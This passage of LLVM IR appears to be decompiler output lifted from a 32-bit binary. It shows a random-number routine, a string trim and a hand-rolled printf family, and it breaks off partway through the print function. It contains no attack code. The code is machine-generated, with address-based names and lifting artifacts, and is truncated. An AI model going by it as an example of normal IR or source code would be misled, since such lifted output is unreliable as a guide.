  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_2a2ac.25, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_2a2ac.25, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_2a54c.20 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
  store i32 %v6_8338, i32* @global_var_2a2a8.28, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_2a54c.20 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_2a54c.20, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2a54c.20 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c11 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c11, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.012, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.012 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.012, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.012, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge2, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge2, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge2 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge2, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_853c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_853c, i32* @ip, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_85ac = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_85ac, i32* @ip, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861819 = load i8, i8* %arg2, align 1
  %v2_861c21 = icmp eq i8 %v2_861819, 0
  br i1 %v2_861c21, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861423 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.022 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.022, 1
  %v1_860c = add i32 %v4_861423, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge3 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8650 ], [ %storemerge3, %dec_label_pc_8660 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a816, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.117, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872027 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e09 = load i8, i8* %arg2, align 1
  %v2_86e411 = icmp eq i8 %v2_86e09, 0
  br i1 %v2_86e411, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc13 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.012, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc13, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872026 = phi i32 [ %v3_872027, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c6, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.37, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872026, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8920 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8920, i32* @ip, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
